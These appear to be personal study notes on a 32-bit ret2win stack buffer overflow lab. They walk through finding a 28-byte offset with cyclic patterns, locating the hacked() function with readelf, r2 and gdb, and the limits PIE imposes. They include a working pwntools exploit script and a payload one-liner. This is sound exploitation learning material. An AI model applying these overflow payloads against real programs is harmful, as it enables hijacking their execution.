Return To Win

Overflow the buffer to redirect the execution to function/address of our choice  

    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments

ret2win: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=33e749ad4c6cf2d730e3d8fe81eec46818d77042, for GNU/Linux 3.2.0, not stripped

There is a function called hacked, which is never called, our goal is to execute that function

we have to overwrite the return address so that program execution dosent go back to main fucntion
Input cyclic 16 : no fault

cyclic 20 : nothing

cyclic 24 : zsh: segmentation fault (core dumped)

so after 20 bytes, we overflow InstrcutionPointer 

# sudo dmesg : check the ip(instrcution pointer value

nothing too odd about it, increase the value by 4 bytes

at 32 bytes, IP becomes : ip 0000000061616168 

we got this from 

#sudo dmesg

so the 4 bytes after 28 cause the Instruction pointer to overflow

need to put the address 'A' * 28 + p32(Address of Hacked)  for the overflow and execute hacked() function

# readelf -s ret2win

# readelf -s ret2win | grep hacked

from here get the address of hacked and that is the address we need to enter after 28 characters

-----------------------------------------

#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'

#Start 

io = process('./ret2win')

#Send to overflow buffer

io.sendlineafter(b':\n' , b'A' * 28 + p32(0x08049186))

# Receive 

print(io.recvall().decode('latin-1'))

------------------------------------------------

instead of dmesg can also use r2

# r2 ret2win
Input : aaaa

# afl

and we can see address of all functions

0x08049186    1 43           sym.hacked

********************

We wont be able to see these addresses if PIE was enabled

we can try

# gcc ret2win.c -o ret2win -fno-stack-protector -z execstack -m32

   PIE:      PIE enabled

32: 000011ad    43 FUNC    GLOBAL DEFAULT   14 hacked

Now readelf dosent give right address

Can try r2 as well

# r2 ret2win
give input
# afl
0x000011ad    1 43           sym.hacked

In this case we dont have memory addresses, just the offsets

If PIE enabled, we only get offset, coz base address chages every time

To get over it we will first need to find base of the binary

-------------

Can also use gdb to get return address

# info functions
0x08049186  hacked

---------------------
Cyclic pattern : how many characters we need to write before we overwrite return address
--------------------

cyclic 32
and run the program in gdb and check EIP value


$eip   : 0x61616168 ("haaa"?)

# cyclic -l 0x61616168
28

so we need to write 28 chars before we overwirte the EIP

# python2 -c "print 28*'A' + '\x86\x91\x04\x08'" > payload

# ./ret2win < payload

*********************

If there was no interesting function we want to return to, we would send 28 normal char, then next 4 would point to an address, and anything after those 4 that will go in EIP would be our own malicious shell code and the char from 29 to 32, rather than poiting to a return address will point to beginning of shell code


After we point to hacked() and its executed, we get segmentation fault, coz hacked dosent point to anywhere else and dosent return to anywhere

in practical, after we have called hacked() we would redirect the execution to somewhere else



